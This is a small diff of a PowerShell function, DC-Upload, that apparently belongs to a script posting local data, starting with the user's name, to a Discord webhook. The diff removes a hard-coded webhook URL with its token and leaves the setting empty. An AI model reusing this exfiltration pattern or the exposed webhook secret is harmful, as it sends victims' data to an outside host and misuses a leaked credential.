@@ -6,7 +6,7 @@ function DC-Upload {
 		[string]$text 
 	)
 
-	$dc = 'https://discord.com/api/webhooks/1267879781404250123/X83marVWwVCWcCfycTSqdGdvFCgSVwNF1BXzS5A_HI-OlIf_A1DX-6I6xz9sJxP2SIvS'
+	#$dc = ''
 
 	$Body = @{
 	  'username' = $env:username
